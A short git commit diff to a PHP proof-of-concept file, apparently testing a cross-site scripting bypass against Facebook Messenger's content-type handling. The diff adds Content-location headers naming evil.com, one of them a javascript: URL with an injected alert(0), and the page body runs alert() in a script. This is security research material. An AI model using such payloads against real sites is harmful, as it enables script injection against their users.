d6b409fe7064638d8b2ceed398a10dc6c0f8cc66
missoum1307 <missoum1307@users.noreply.github.com>
2018-03-15 00:36:04 +0100

    Update fbmessenegerxss.php

--- fbmessenegerxss.php
+++ fbmessenegerxss.php
@@ -1,6 +1,10 @@
 <?php 
 header('Content-type: application/octet-stream');
 header('X-content-type-options: nosniff');
+header('Content-location: evil.Com');
+header('Content-location: javascript://evil.com/?%0Aalert(0)');
+
+
 ?>
 <html><script>alert('it should be downloadable instead ')</script>
 this page's content type is application/octet-stream and has X-content-type-options: nosniff implemented, hence this content shouln't be rendered!!
